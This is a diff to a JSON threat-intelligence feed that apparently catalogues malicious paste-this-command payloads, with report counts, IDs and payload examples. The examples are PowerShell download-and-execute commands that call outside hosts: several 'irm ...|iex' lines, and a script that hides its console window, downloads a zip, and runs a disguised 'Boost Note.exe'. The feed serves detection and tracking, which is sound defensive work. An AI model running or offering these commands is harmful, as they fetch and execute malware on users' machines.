@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 167,
-    "ReportCount": 167,
+    "DistinctPayloadCount": 169,
+    "ReportCount": 169,
     "FirstSeen": "2026-11-11T15:34:50.263000+00:00",
-    "LastSeen": "2026-11-18T05:56:34.584000+00:00",
+    "LastSeen": "2026-11-18T10:54:56.701000+00:00",
     "ReportIds": [
       "cmwca5h1o061v0omlwaufjf39",
       "cmwd4cakt005k0omlhwj5h50t",
@@ -172,11 +172,14 @@
       "cmwlp2bf81p7r0omlpgfmfqy3",
       "cmwlp4p961pdv0oml42qise26",
       "cmwlp7eru1pez0oml6hrurmma",
-      "cmwlpksd71q9i0omleq8xjfc9"
+      "cmwlpksd71q9i0omleq8xjfc9",
+      "cmwlzwqas1r3f0omlavhnj44e",
+      "cmwm08hou1raj0omlprcdx0ey"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
       "irm 'browse-cloud.codes/03b93fa50e7a9f43'|iex;",
+      "irm 'browse-cloud.codes/045dc45870c27c02'|iex;",
       "irm 'browse-cloud.codes/058ff855ad8e7e30'|iex;",
       "irm 'browse-cloud.codes/062c477a90814654'|iex;",
       "irm 'browse-cloud.codes/0cb1c65addb09e2d'|iex;",
@@ -289,6 +292,7 @@
       "irm 'browse-cloud.codes/b9f17bd99b1e9a1d'|iex;",
       "irm 'browse-cloud.codes/bb10ac06f389d7c9'|iex;",
       "irm 'browse-cloud.codes/c213016b77263b96'|iex;",
+      "irm 'browse-cloud.codes/c27615610ccab1da'|iex;",
       "irm 'browse-cloud.codes/c4c17c70dac2040d'|iex;",
       "irm 'browse-cloud.codes/c5621fb7f3b4133b'|iex;",
       "irm 'browse-cloud.codes/c59b6384f87c88f2'|iex;",
@@ -867,9 +871,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 43,
+    "ReportCount": 45,
     "FirstSeen": "2026-11-11T17:57:00.720000+00:00",
-    "LastSeen": "2026-11-18T09:16:54.909000+00:00",
+    "LastSeen": "2026-11-18T10:45:21.264000+00:00",
     "ReportIds": [
       "cmwcf8b7j07s00omljo01l4y5",
       "cmwcq9cnn0c1l0omlfc0yrkd9",
@@ -913,7 +917,9 @@
       "cmwkjaxor1erj0omlu3i5ekvr",
       "cmwlny3101nfu0omlp5zxyi3o",
       "cmwlqt2lp1qjq0omlqi37wlx9",
-      "cmwlwqf991qtd0omluedqwsp1"
+      "cmwlwqf991qtd0omluedqwsp1",
+      "cmwlzsh9q1r0l0oml4gpgxjes",
+      "cmwlzw5oa1r2p0omliz6xurp7"
     ],
     "PayloadExamples": [
       "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
@@ -1027,9 +1033,9 @@
   {
     "Pattern": "IRM <URL>\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
     "DistinctPayloadCount": 1,
-    "ReportCount": 9,
+    "ReportCount": 10,
     "FirstSeen": "2026-11-12T07:26:34.025000+00:00",
-    "LastSeen": "2026-11-17T13:50:59.134000+00:00",
+    "LastSeen": "2026-11-18T10:46:09.706000+00:00",
     "ReportIds": [
       "cmwd85ele02an0omlhg2v44z8",
       "cmwdamo6k02u90omlobyiekvn",
@@ -1039,7 +1045,8 @@
       "cmwgfhtxn0l8j0omldvxcqc8p",
       "cmwgin1jy0lh20omlj4jcehdg",
       "cmwkp88891fgr0omlhjevhb4h",
-      "cmwkr312l1fmb0omljm9yarua"
+      "cmwkr312l1fmb0omljm9yarua",
+      "cmwlzx7181r4v0omlc0wtmgup"
     ],
     "PayloadExamples": [
       "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX"
